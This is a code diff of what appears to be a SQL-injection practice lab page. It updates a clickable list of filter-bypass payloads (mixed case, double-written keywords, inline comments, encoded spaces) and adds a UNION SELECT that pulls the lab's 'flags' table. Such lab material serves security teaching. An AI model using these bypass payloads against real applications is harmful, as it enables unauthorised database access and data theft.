@@ -322,20 +322,23 @@ $conn->close();
             <h3>🎯 绕过技巧Payload</h3>
             <div class="payload-list">
                 <h4>1. 大小写混合</h4>
-                <code onclick="setId('1 UnIoN SeLeCt 1,2,3,4')">1 UnIoN SeLeCt 1,2,3,4</code>
+                <code onclick="setId('1 UnIoN SeLeCt 1,2,3,4,5')">1 UnIoN SeLeCt 1,2,3,4,5</code>
                 
                 <h4>2. 双写绕过</h4>
-                <code onclick="setId('1 ununionion seselectlect 1,2,3,4')">1 ununionion seselectlect 1,2,3,4</code>
+                <code onclick="setId('1 ununionion seselectlect 1,2,3,4,5')">1 ununionion seselectlect 1,2,3,4,5</code>
                 
                 <h4>3. 注释绕过</h4>
-                <code onclick="setId('1 /*!UNION*/ /*!SELECT*/ 1,2,3,4')">1 /*!UNION*/ /*!SELECT*/ 1,2,3,4</code>
-                <code onclick="setId('1 +UNION+SELECT+1,2,3,4')">1 +UNION+SELECT+1,2,3,4</code>
+                <code onclick="setId('1 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5')">1 /*!UNION*/ /*!SELECT*/ 1,2,3,4,5</code>
+                <code onclick="setId('1 +UNION+SELECT+1,2,3,4,5')">1 +UNION+SELECT+1,2,3,4,5</code>
                 
-                <h4>4. 编码绕过</h4>
+                <h4>4. 查询flag表</h4>
+                <code onclick="setId('0 UnIoN SeLeCt id,flag,description,flag,created_at FrOm flags')">0 UnIoN SeLeCt id,flag,description,flag,created_at FrOm flags</code>
+                
+                <h4>5. 编码绕过</h4>
                 <code onclick="setId('1 AND 1=1')">1 AND 1=1</code>
                 <code onclick="setId('1 OR 1=1')">1 OR 1=1</code>
                 
-                <h4>5. 特殊字符</h4>
+                <h4>6. 特殊字符</h4>
                 <code onclick="setId('1%20AND%201=1')">1%20AND%201=1</code>
                 <code onclick="setId('1/**/AND/**/1=1')">1/**/AND/**/1=1</code>
             </div>
